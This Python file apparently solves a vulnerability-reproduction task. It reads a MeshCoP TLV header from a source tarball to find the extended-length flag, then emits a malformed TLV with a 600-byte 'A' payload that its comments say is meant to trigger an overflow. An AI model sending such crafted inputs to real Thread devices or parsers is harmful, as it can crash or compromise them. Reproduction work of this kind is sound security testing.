import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        ext_flag = 0x80

        # Try to discover the extended-length flag from meshcop_tlvs.hpp if present.
        try:
            with tarfile.open(src_path, "r:*") as tar:
                meshcop_member = None
                for m in tar.getmembers():
                    name = m.name.lower()
                    if name.endswith("meshcop_tlvs.hpp") or name.endswith("meshcop_tlvs.h"):
                        meshcop_member = m
                        break

                if meshcop_member is not None:
                    f = tar.extractfile(meshcop_member)
                    if f is not None:
                        text = f.read().decode("utf-8", "ignore")

                        # Look for an enum/constant related to "Extended" that looks like a bitmask.
                        patterns = [
                            r'\b(k[A-Za-z0-9_]*Extended[A-Za-z0-9_]*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                            r'\b(k[A-Za-z0-9_]*Long[A-Za-z0-9_]*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                        ]
                        for pat in patterns:
                            for m in re.finditer(pat, text):
                                try:
                                    val = int(m.group(2), 0)
                                    # Heuristic: extended-length flag should be a high bit (>= 0x10).
                                    if 0x10 <= val <= 0xFF:
                                        ext_flag = val & 0xFF
                                        raise StopIteration
                                except ValueError:
                                    continue
                        # If we exit loop normally, keep default ext_flag.
        except StopIteration:
            pass
        except Exception:
            # On any failure, fall back to 0x80.
            ext_flag = 0x80

        # Base TLV type: choose 0 (typically a valid MeshCoP TLV type, e.g., Channel).
        base_type = 0

        # Length for the extended TLV's value field.
        # Must be > typical 1-byte TLV max (255) to trigger overflow, but not enormous.
        ext_len = 600

        type_byte = (base_type & 0xFF) | (ext_flag & 0xFF)
        len_hi = (ext_len >> 8) & 0xFF
        len_lo = ext_len & 0xFF

        header = bytes([type_byte, len_hi, len_lo])
        payload = b"A" * ext_len

        return header + payload
